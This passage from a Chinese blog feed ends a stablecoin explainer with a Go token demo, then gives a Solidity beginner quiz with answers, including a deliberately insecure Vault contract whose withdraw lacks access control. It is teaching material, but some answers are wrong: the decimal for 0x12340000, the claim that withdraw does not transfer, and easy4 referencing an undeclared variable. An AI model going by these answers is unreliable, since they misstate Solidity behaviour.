class="line"></span><br><span class="line">    <span class="keyword">if</span> sc.Balances[from] &lt; amount &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">&quot;insufficient balance to burn&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sc.Balances[from] -= amount</span><br><span class="line">    sc.TotalSupply -= amount</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户转账</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sc *Stablecoin)</span></span> transfer(from, to <span class="type">string</span>, amount <span class="type">uint64</span>) <span class="type">error</span> &#123;</span><br><span class="line">    sc.mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> sc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc.Balances[from] &lt; amount &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">&quot;insufficient balance&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sc.Balances[from] -= amount</span><br><span class="line">    sc.Balances[to] += amount</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询余额</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sc *Stablecoin)</span></span> balanceOf(user <span class="type">string</span>) <span class="type">uint64</span> &#123;</span><br><span class="line">    sc.mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> sc.mu.Unlock()</span><br><span class="line">    <span class="keyword">return</span> sc.Balances[user]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试用例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    admin := <span class="string">&quot;admin&quot;</span></span><br><span class="line">    user := <span class="string">&quot;alice&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化一个最大供应 1,000,000 的稳定币</span></span><br><span class="line">    sc := NewStablecoin(<span class="string">&quot;Simple USD&quot;</span>, <span class="string">&quot;sUSD&quot;</span>, admin, <span class="number">100_000</span>, <span class="number">1_000_000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 管理员铸币</span></span><br><span class="line">    <span class="keyword">if</span> err := sc.mint(user, <span class="number">5000</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Mint error:&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转账</span></span><br><span class="line">    <span class="keyword">if</span> err := sc.transfer(user, <span class="string">&quot;bob&quot;</span>, <span class="number">2000</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Transfer error:&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁</span></span><br><span class="line">    <span class="keyword">if</span> err := sc.burn(user, <span class="number">1000</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Burn error:&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询余额</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Alice Balance: %d sUSD\n&quot;</span>, sc.balanceOf(user))</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Bob Balance: %d sUSD\n&quot;</span>, sc.balanceOf(<span class="string">&quot;bob&quot;</span>))</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Total Supply: %d sUSD\n&quot;</span>, sc.TotalSupply)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;"></font></p>
<h4 id="代码中的方法介绍"><a href="#代码中的方法介绍" class="headerlink" title="代码中的方法介绍"></a><font style="color:#000000;">代码中的方法介绍</font></h4><table>
<thead>
<tr>
<th><strong><font style="color:#000000;">模块</font></strong></th>
<th><strong><font style="color:#000000;">功能说明</font></strong></th>
</tr>
</thead>
<tbody><tr>
<td><font style="color:#000000;">mint()</font></td>
<td><font style="color:#000000;">模拟后台托管系统给用户铸币，仅 owner 可调用</font></td>
</tr>
<tr>
<td><font style="color:#000000;">burn()</font></td>
<td><font style="color:#000000;">用户赎回法币时销毁稳定币</font></td>
</tr>
<tr>
<td><font style="color:#000000;">transfer()</font></td>
<td><font style="color:#000000;">用户之间的转账</font></td>
</tr>
<tr>
<td><font style="color:#000000;">balanceOf()</font></td>
<td><font style="color:#000000;">查询任意地址的余额</font></td>
</tr>
<tr>
<td><font style="color:#000000;">并发锁 sync.Mutex</font></td>
<td><font style="color:#000000;">确保并发调用安全性</font></td>
</tr>
</tbody></table>
<p><font style="color:#000000;"></font></p>
<h2 id="无处不在：稳定币如何改变我们的数字生活？"><a href="#无处不在：稳定币如何改变我们的数字生活？" class="headerlink" title="无处不在：稳定币如何改变我们的数字生活？"></a><font style="color:#000000;">无处不在：稳定币如何改变我们的数字生活？</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/57044047/1750174804139-cb036c07-1267-460b-bc39-b802359cd30f.jpeg"></p>
<h3 id="1-网上购物的“数字支付工具”"><a href="#1-网上购物的“数字支付工具”" class="headerlink" title="1. 网上购物的“数字支付工具”"></a>1. 网上购物的“数字支付工具”</h3><p>想象一下，你平时在京东、淘宝买东西，用微信或支付宝支付。未来，稳定币也能做到。</p>
<ul>
<li><strong>怎么用？</strong> 电商网站可以在他们的支付系统里，直接加上一个用稳定币收款的功能。你点付款的时候，选择用 <strong>USDC</strong> 或者 <strong>USDT</strong> ，就像扫码付款一样，直接把稳定币转过去就行。像美国的一些大型电商平台，比如 <strong>Overstock</strong>，就允许顾客用稳定币支付。</li>
<li><strong>有什么好？</strong> 支付过程可能更快，手续费更低。而且，如果电商平台想，他们可以直接拿着你的稳定币，不用马上换成人民币，等需要用法币的时候再换。这样可以减少中间环节的费用。 这为电商平台提供了更多的支付选择和资金管理灵活性。</li>
<li><strong>未来升级：</strong> 就像 Layer 2（扩容高架桥），比起传统支付面临网络拥堵的问题，稳定币支付还可以走这些“高架桥”，让支付速度更快，效率更高。</li>
</ul>
<blockquote>
<p><font style="color:#000000;">Layer 2（L2） 是建立在区块链主网（如以太坊，即 Layer 1）之上的</font><strong><font style="color:#000000;">扩容技术。</font></strong><font style="color:#000000;">你可以把 区块链主网（Layer 1） 比作一条只有一条车道的繁忙高速公路，而 Layer 2 就是在旁边修建的多车道，用来分流车辆，提高通行效率。</font></p>
</blockquote>
<h3 id="2-去中心化金融（DeFi）的“血液”"><a href="#2-去中心化金融（DeFi）的“血液”" class="headerlink" title="2. 去中心化金融（DeFi）的“血液”"></a>2. 去中心化金融（DeFi）的“血液”</h3><p>还记得我们说的区块链是个公开账本吗？在区块链上，有一类叫做 <strong>DeFi（去中心化金融）</strong>的特殊银行和金融服务。稳定币就是这些“数字银行”里流动的“血液”。</p>
<p><font style="color:#000000;">DeFi就是一套用代码代替银行的金融系统。简单说，DeFi就像金融界的无人超市——方便又便宜，但货架塌了得自己扛。</font></p>
<ul>
<li><strong>衡量价值：</strong> 你看足球比赛，比分用“进球数”来衡量。在 DeFi 里，很多时候资产的价值就用稳定币来衡量。比如，我们常说的 <strong>ETH&#x2F;USDC</strong> 交易对，就是用 USDC 来给以太坊（ETH）定价。</li>
<li><strong>借钱和放贷：</strong> 你可以把稳定币存到 DeFi 平台里，给别人借钱，然后赚利息；或者用自己的其他数字资产作抵押，从平台里借出稳定币。稳定币的稳定价格让这些借贷变得更可靠。</li>
<li><strong>提高资金效率：</strong> 有些平台专门设计来让不同稳定币之间互相兑换更便宜、更快速（比如 <strong>Curve</strong> 这样的平台），这能让资金在数字世界里流转得更顺畅、更有效率。</li>
</ul>
<h3 id="3-跨链流通的“通行证”"><a href="#3-跨链流通的“通行证”" class="headerlink" title="3. 跨链流通的“通行证”"></a>3. 跨链流通的“通行证”</h3><p>现在的区块链世界就像有很多个独立的国家，每个国家都有自己的货币。稳定币就像一张“通用通行证”，可以在不同的“国家”（区块链）之间流通。</p>
<ul>
<li><strong>多地发行：</strong> 大多数主流稳定币，比如 USDT 和 USDC，不只在一个区块链上发行，它们在以太坊、波场、Solana 等多个区块链上都有自己的“版本”。</li>
<li><strong>跨链桥：</strong> 如果你想把以太坊上的稳定币，转到波场上的稳定币，就需要通过“跨链桥”这个工具。<strong>它就像一座连接不同国家的桥梁</strong>，让你能把资产从一个区块链安全地转移到另一个区块链。</li>
</ul>
<h4 id="国内应用实例-——-sHKD"><a href="#国内应用实例-——-sHKD" class="headerlink" title="国内应用实例 —— sHKD"></a><font style="color:#000000;">国内应用实例 —— sHKD</font></h4><p><font style="color:#000000;">譬如本文开头所提，</font><font style="color:#000000;">京东币链科技（Coinlink）在香港推出的 HKD稳定币项目。</font></p>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;">京东科技集团旗下的子公司——</font><strong><font style="color:#000000;">京东币链科技（香港）有限公司（JINGDONG Coinlink Technology Hong Kong Limited）</font></strong><font style="color:#000000;">，正在香港推出一款锚定港元的</font><strong><font style="color:#000000;">法币储备型稳定币</font></strong><font style="color:#000000;">，币值与港元以 </font><strong><font style="color:#000000;">1:1 比例锚定</font></strong><font style="color:#000000;">。</font></p>
<p><font style="color:#000000;">该项目已进入第二阶段测试，定位于跨境支付、零售支付、投资结算和供应链金融等领域。</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57044047/1750001937153-dfadc23d-11f9-48f2-9f74-077416df28b9.png"></p>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;">京东币链科技推出的 sHKD 项目，作为香港本地稳定币的重要探索者之一，融合了合规、技术与商业场景的多重优势。</font></p>
<p><font style="color:#000000;">它不仅支持京东内部业务生态，也将服务于更广泛的跨境电商、金融科技、Web3 应用领域。随着香港加快数字金融监管布局，sHKD 有望成为东亚地区首批落地的</font><strong><font style="color:#000000;">合规型法币稳定币</font></strong><font style="color:#000000;">典范。</font></p>
<h3 id="4-应对风险的“保险箱”"><a href="#4-应对风险的“保险箱”" class="headerlink" title="4. 应对风险的“保险箱”"></a>4. 应对风险的“保险箱”</h3><p>这个我们之前也提到了，但它的重要性值得再强调。</p>
<ul>
<li><strong>规避波动：</strong> 当比特币、以太坊这些加密货币价格像坐过山车一样剧烈波动时，很多人会把它们兑换成稳定币。</li>
<li><strong>像“现金”一样：</strong> 这就像你在股市大跌的时候，把股票卖掉，把钱放到银行卡里，等待市场好转再入场一样。稳定币这时候就扮演了“数字现金”或者“避险资产”的角色，帮你锁定收益或减少损失。</li>
</ul>
<h2 id="硬币背面：稳定币的挑战与隐忧"><a href="#硬币背面：稳定币的挑战与隐忧" class="headerlink" title="硬币背面：稳定币的挑战与隐忧"></a>硬币背面：稳定币的挑战与隐忧</h2><p>稳定币听起来很美好，但要真正实现“全球数字现金”这个宏大愿景，它还有两大“拦路虎”要解决：<strong>隐私保护</strong>和<strong>可扩展性</strong>。</p>
<p>理想的数字货币，应该能做到交易<strong>飞快</strong>、<strong>手续费超低</strong>、而且还能<strong>保护你的隐私</strong>。目前看来，稳定币在这几方面还没完全达标。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57044047/1750174833583-7ba4ee8a-6003-4e65-9e51-b4d07b3ff3b7.png"></p>
<hr>
<h3 id="1-隐私保护：谁想让自己的银行流水被所有人看到？"><a href="#1-隐私保护：谁想让自己的银行流水被所有人看到？" class="headerlink" title="1. 隐私保护：谁想让自己的银行流水被所有人看到？"></a>1. 隐私保护：谁想让自己的银行流水被所有人看到？</h3><p>这是稳定币能否被大家广泛接受的关键。咱们平时用银行卡、支付宝、微信支付，虽然商家知道你的交易，但你的所有交易记录不会被全世界的人看到。</p>
<p>但区块链的特点是<strong>公开透明</strong>，所有交易都会被记录在一个大家都能看的账本上</p>
<p>虽然你的区块链地址是匿名的（就像一个银行账号，大家不知道它是谁的），通过分析链上的交易数据，或者直接通过区块链浏览器（一种查询链上交易的工具）查找，任何人都可以追踪到你的交易路径，甚至找出你和谁在交易。</p>
<p>咱们普通人可能觉得无所谓，但想想<strong>企业</strong>、<strong>政府</strong>和<strong>金融机构</strong>，他们进行商业往来时，肯定希望自己的交易信息是保密的，不想让竞争对手或外人一览无余。</p>
<p>而且可以想象一下，你口袋里有100块钱，我口袋里也有100块钱，它们是等价的，可以互相替换。这就是“可替代性”。但如果区块链上的每一笔钱都被人知道它曾经去过哪，被谁用过，<font style="color:rgb(26, 32, 41);">使得每一笔钱不再是一个抽象的、无差别的价值单位，而变成了一个带有“身份”和“历史”的实体。</font></p>
<p><font style="color:rgb(26, 32, 41);">这个“身份”和“历史”会影响人们对它的价值判断、信任程度和使用范围，从而导致不同“身份”的钱之间出现了价值或功能上的差异，最终破坏了可替代性的基础——即“等价”和“无条件可接受”。</font></p>
<hr>
<h3 id="2-可扩展性：既要快、要便宜，又要兼顾去中心化和安全，太难了！"><a href="#2-可扩展性：既要快、要便宜，又要兼顾去中心化和安全，太难了！" class="headerlink" title="2. 可扩展性：既要快、要便宜，又要兼顾去中心化和安全，太难了！"></a>2. 可扩展性：既要快、要便宜，又要兼顾去中心化和安全，太难了！</h3><p>咱们前面讲过 Layer 1 和 Layer 2，就是为了解决速度慢和费用高的问题。但稳定币要实现真正的可扩展性，还得同时兼顾<strong>隐私</strong>（比如企业不想交易完全透明）和<strong>合规</strong>（比如反洗钱的要求），这可太难了。</p>
<ul>
<li><strong>速度和成本限制：</strong> 大多数稳定币，比如 <strong>USDT</strong> 和 <strong>USDC</strong>，都是运行在<strong>以太坊</strong>这类公链上的。这些公链就像是主干道，虽然安全，但<strong>交易处理速度有限</strong>，而且高峰期<strong>手续费会很高</strong>。这就像一条路太窄，车太多，就会堵车，过路费也贵。</li>
<li><strong>多链部署和碎片化：</strong> 稳定币为了提升交易效率，通常会在多条区块链（比如以太坊、波场、Solana等）上同时发行，这就像在多个城市之间修建了不同的高速公路。</li>
</ul>
<p>但这种方式也带来了两个主要问题：首先，当用户需要把稳定币从一条链转移到另一条链时，必须依赖”跨链桥”技术，这些桥梁不仅<strong>技术复杂</strong>，还存在<strong>安全隐患</strong>，历史上就发生过多次跨链桥遭黑客攻击导致巨额资产被盗的事件。</p>
<p>其次，当资产跨多链发行时，资金和流动性会被分散，导致单链交易深度下降、效率降低，并影响整体市场的流动性和价格一致性。就像大河分流成多条小溪，每条小溪的水流都变弱了。</p>
<hr>
<h3 id="3-摆脱“锚定”的诱惑：但路漫漫其修远兮"><a href="#3-摆脱“锚定”的诱惑：但路漫漫其修远兮" class="headerlink" title="3. 摆脱“锚定”的诱惑：但路漫漫其修远兮"></a>3. 摆脱“锚定”的诱惑：但路漫漫其修远兮</h3><p>理论上，如果一个稳定币被大家普遍接受，都用它来支付和结算，形成了一个自己的小生态，那它可能就不需要完全依赖外部的美元或其他资产来维持稳定了。</p>
<p>它自身的“被广泛使用”就成了它价值稳定的基础，就像现实中的人民币或美元一样，大家相信它有价值，它就有价值。</p>
<ul>
<li><strong>挑战巨大：</strong> 要实现这个愿景，需要非常漫长且艰巨的市场培育过程。大家得真的愿意用它来买卖东西，而不是只把它当成在加密货币之间切换的工具。</li>
<li><strong>算法稳定币的警示：</strong> 特别是那些没有真实资产支撑的<strong>算法稳定币</strong>，它们想通过算法来保持稳定。但历史告诉我们，这种方式非常脆弱，一旦市场信心动摇，就可能彻底崩盘。建立用户对这类稳定币的信任，将是巨大的挑战。</li>
</ul>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a><font style="color:#000000;">结语</font></h2><p><font style="color:#000000;">很多人通常认为，稳定币就是美元的“完全替代品”，但实际情况是，稳定币只是被设计成其价格大致围绕美元波动。</font></p>
<p><font style="color:#000000;">即使是那些背后有足够抵押物支持、且可以随时兑换的稳定币，它们的市场价格也未必总是严格等于美元——这会受到市场供需变化和交易对手风险等因素的影响。</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57044047/1750058892794-2951933c-4c7f-4378-b6f6-3b657ca051d7.png" alt="近月USDT与美元价格对比"></p>
<p><font style="color:#000000;">因此，要让稳定币真正发挥作用，用户应当不再把它看作和美元等值的“影子美元”，而是将其视为一种相对独立的资产，使这种资产通过</font><strong><font style="color:#000000;">抵押机制、市场激励</font></strong><font style="color:#000000;">和</font><strong><font style="color:#000000;">对未来价格的预期</font></strong><font style="color:#000000;">，始终尽可能接近美元价值。</font></p>
<p><font style="color:#000000;">这意味着，稳定币即使未能完全维持与美元的严格挂钩，也有可能提供足够的价格稳定性。</font></p>
<p><font style="color:#000000;">实际上，随着围绕稳定币本身形成经济活动（如支付、结算、储值等），是否完美“挂钩”反而变得不再那么重要。</font></p>
<p><font style="color:#000000;">只要大家愿意收取并持有这种稳定币，并且也用它去支付上游供应商费用，同时这种稳定币在市场中广泛流通，它就可以很好地发挥“稳定”的作用，即便价格偶尔偏离1美元也无伤大雅。</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/57044047/1750174961722-09ce9703-7af2-4e23-bfc3-594c2632e111.jpeg"></p>
<p><font style="color:#000000;">稳定币的出现，标志着区块链从“技术试验”向“金融基础设施”迈出关键一步。从底层合约设计、抵押机制，到预言机集成与清算流程。</font></p>
<p><strong><font style="color:#000000;">稳定币是当前区块链系统中技术最为复杂、使用最为广泛的核心模块之一。</font></strong><font style="color:#000000;">未来，随着合规化与跨链技术的进一步完善，稳定币将有望成为高效、安全、智能的支付工具。</font></p>
<p><font style="color:#000000;"></font></p>
<blockquote>
<p><em><font style="color:rgb(25, 27, 31);">免责声明：以上内容仅供讨论交流，不构成任何投资建议。</font></em></p>
</blockquote>
]]></content>
      <tags>
        <tag>DeFi</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次题解</title>
    <url>/2025/01/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><strong>有无除了直接点击deploy外的其他方法部署一个合约</strong></p>
<h2 id="第一题题解"><a href="#第一题题解" class="headerlink" title="第一题题解"></a>第一题题解</h2><p><code>create</code>和<code>create2</code></p>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><strong>简单说说怎样优化一下这个私人金库合约</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        // just a receive function</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external view payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">        // code? what code?</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() internal view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">        // oh i don&#x27;t want you get balance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) external &#123;</span><br><span class="line">        require(amount &lt;= address(this).balance, &quot;Insufficient balance&quot;);</span><br><span class="line">        // okay okay, let&#x27;s withdraw</span><br><span class="line">        payable(owner).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第二题题解"><a href="#第二题题解" class="headerlink" title="第二题题解"></a>第二题题解</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        // 接收ETH的函数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款函数，允许用户向合约发送ETH</span><br><span class="line">    // 不用限制调用者，多来点何乐而不为</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取合约余额，可以被外部调用，不想别人看见应该限制msg.sender</span><br><span class="line">    function getBalance() external view returns (uint) &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can view balance&quot;);</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提款函数，只有所有者可以调用</span><br><span class="line">    function withdraw(uint amount) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</span><br><span class="line">        require(amount &lt;= address(this).balance, &quot;Insufficient balance&quot;);</span><br><span class="line">        payable(owner).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>改进点主要在于以下几点：</p>
<h3 id="1-owner-的设置"><a href="#1-owner-的设置" class="headerlink" title="1. owner 的设置"></a>1. <strong><code>owner</code> 的设置</strong></h3><ul>
<li><strong>代码一</strong>: <code>owner</code> 地址没有在构造函数中显式设置，可能是在部署合约后手动设定或假设默认是部署者的地址（但这部分不明确，可能存在漏洞）。</li>
<li><strong>代码二</strong>: 在构造函数中显式设置 <code>owner = msg.sender;</code>，确保合约的所有者是部署合约的人，避免了潜在的漏洞。</li>
</ul>
<h3 id="2-getBalance-的访问限制"><a href="#2-getBalance-的访问限制" class="headerlink" title="2. getBalance 的访问限制"></a>2. <strong><code>getBalance</code> 的访问限制</strong></h3><ul>
<li><strong>代码一</strong>: <code>getBalance</code> 函数是 <code>internal</code>，意味着只有合约内部或者继承的合约可以调用，而不能直接由外部调用。没有任何访问控制。</li>
<li><strong>代码二</strong>: <code>getBalance</code> 函数是 <code>external</code>，并且增加了访问控制：<code>require(msg.sender == owner, &quot;Only owner can view balance&quot;);</code>，只有合约所有者可以查看合约的余额，增强了安全性。</li>
</ul>
<h3 id="3-withdraw-的访问控制"><a href="#3-withdraw-的访问控制" class="headerlink" title="3. withdraw 的访问控制"></a>3. <strong><code>withdraw</code> 的访问控制</strong></h3><ul>
<li><strong>代码一</strong>: <code>withdraw</code> 函数没有访问控制，任何人都可以调用它进行提款。</li>
<li><strong>代码二</strong>: <code>withdraw</code> 函数增加了访问控制：<code>require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</code>，只有合约所有者才能提款，增强了合约的安全性。</li>
</ul>
<h3 id="4-deposit-函数的调用者限制"><a href="#4-deposit-函数的调用者限制" class="headerlink" title="4. deposit 函数的调用者限制"></a>4. <strong><code>deposit</code> 函数的调用者限制</strong></h3><ul>
<li><strong>代码一</strong>: <code>deposit</code> 函数允许任何人向合约发送ETH，没有限制谁可以调用这个函数。</li>
<li><strong>代码二</strong>: <code>deposit</code> 函数允许任何人调用，并没有限制，注释提到“多来点何乐而不为”，即对存款没有限制。虽然没有直接限制，但存款逻辑在两个合约中是一样的。</li>
</ul>
<h3 id="5-合约注释"><a href="#5-合约注释" class="headerlink" title="5. 合约注释"></a>5. <strong>合约注释</strong></h3><ul>
<li><strong>代码二</strong>: 注释比代码一更详细，解释了各个函数的作用和潜在的修改建议。例如，注释指出存款函数不需要限制调用者，余额函数应限制访问等，增强了代码可读性和文档化。</li>
</ul>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul>
<li><p>代码二</p>
<p> 基于代码一添加了更严格的安全控制：</p>
<ul>
<li>显式设置 <code>owner</code>；</li>
<li>对 <code>getBalance</code> 和 <code>withdraw</code> 函数添加了所有者权限控制（external）；</li>
<li>详细的注释和更好的文档化；</li>
<li>对合约逻辑没有大的改动，但增加了安全性。</li>
</ul>
</li>
</ul>
<h2 id="第三题（类型转换）"><a href="#第三题（类型转换）" class="headerlink" title="第三题（类型转换）"></a>第三题（类型转换）</h2><p><strong>这是一道类似于填空题，只要你输入正确的b,b1,c,d,e;就能将flag变为true，你能获得几个flag呢；(本题不用进行合约交互)；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract easy&#123;</span><br><span class="line">bool public flag1 = false;</span><br><span class="line">bool public flag2 = false;</span><br><span class="line">bool public flag3 = false;</span><br><span class="line">bool public flag4 = false;</span><br><span class="line">bool public flag5 = false;</span><br><span class="line">bytes2 a = 0x1234;</span><br><span class="line">uint16 b = uint16(a);</span><br><span class="line">uint32 b1 = uint16(a);</span><br><span class="line">uint32 c = uint32(bytes4(a));</span><br><span class="line">uint8 d = uint8(uint16(a));</span><br><span class="line">uint8 e = uint8(bytes1(a));</span><br><span class="line">function easy1( uint16 _b) public &#123;</span><br><span class="line">	if(b == _b)</span><br><span class="line">		flag1 = true;</span><br><span class="line">	else</span><br><span class="line">		flag1 = false;</span><br><span class="line">&#125;</span><br><span class="line">function easy2( uint32 _b1) public &#123;</span><br><span class="line">	if(b1 == _b1)</span><br><span class="line">		flag2 = true;</span><br><span class="line">	else</span><br><span class="line">		flag2 = false;</span><br><span class="line">&#125;</span><br><span class="line">function easy3( uint32 _c) public &#123;</span><br><span class="line">	if(c == _c)</span><br><span class="line">		flag3 = true;</span><br><span class="line">	else</span><br><span class="line">		flag3 = false;</span><br><span class="line">&#125;</span><br><span class="line">function easy4( uint16 _e) public &#123;</span><br><span class="line">	if(d == _d)</span><br><span class="line">		flag4 = true;</span><br><span class="line">	else</span><br><span class="line">		flag4 = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function easy5( uint16 _e) public &#123;</span><br><span class="line">	if(e == _e)</span><br><span class="line">		flag5 = true;</span><br><span class="line">	else</span><br><span class="line">		flag5 = false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第三题题解"><a href="#第三题题解" class="headerlink" title="第三题题解"></a>第三题题解</h2><p><strong>十六进制：</strong></p>
<p>b1 &#x3D; <code>0x00001234</code></p>
<p> c &#x3D; <code>0x12340000</code></p>
<p> d &#x3D; <code>0x34</code></p>
<p> e &#x3D; <code>0x12</code></p>
<p><strong>十进制：</strong></p>
<p>b1 &#x3D; <code>4660</code></p>
<p>c &#x3D; <code>305419896</code></p>
<p>d &#x3D; <code>52</code></p>
<p>e &#x3D; <code>18</code></p>
<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p><strong>4.众所周知，solidity没有浮点数，那么当我想要在部署合约时带0.1 ether，应该怎么做呢</strong></p>
<p>【1】</p>
<h2 id="第四题题解"><a href="#第四题题解" class="headerlink" title="第四题题解"></a>第四题题解</h2><ol>
<li>点击右侧的ether，换成其他单位进行转换传入即可。</li>
<li>部署一个合约传入1ether，再通过代码转也可以。</li>
</ol>
<h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p><strong>5.说说有几种方式能让这个合约拥有余额</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Transfer &#123;</span><br><span class="line">    // Mapping to store player balances</span><br><span class="line">    mapping(address =&gt; uint256) public player;</span><br><span class="line"></span><br><span class="line">    // Function to deposit Ether into the contract</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        player[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to withdraw Ether from the contract</span><br><span class="line">    function withdraw(uint256 amount) external payable &#123;</span><br><span class="line">        // Ensure the sender has enough balance to withdraw the specified amount</span><br><span class="line">        require(player[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        player[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">        // Transfer the amount back to the sender</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function to accept Ether</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="第五题题解："><a href="#第五题题解：" class="headerlink" title="第五题题解："></a>第五题题解：</h2><p>1.EOA账户直接点击deposit进行操作</p>
<p>2.通过另一个合约调用转账函数转账(transfer,call,send,delegatecall)</p>
<p>3.自毁合约转账</p>
<p>注意withdraw并没有真的转账，所以通过接收合约的receive或者fallback函数再次调用deposit不可行</p>
<h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 合约地址: 0xD7e21bfaa70e885AEc831334E2DdD8a052db777b</span><br><span class="line">// 测试网：Sepolia</span><br><span class="line">// 考察点：一般的代码阅读能力</span><br><span class="line">// 题目背景：小明是一个数学爱好者，他比较喜欢将8个较大素数作为自己的密码来存储</span><br><span class="line">// 备注：把除去最大的两个素数的其它较大八个素数从小到大排序即可</span><br><span class="line"></span><br><span class="line">contract ArrayMapping &#123;</span><br><span class="line">    // Mapping to store valid numbers</span><br><span class="line">    mapping(uint8 =&gt; bool) public numberMapping;</span><br><span class="line"></span><br><span class="line">    // Mapping to track addresses with the &quot;flag&quot;</span><br><span 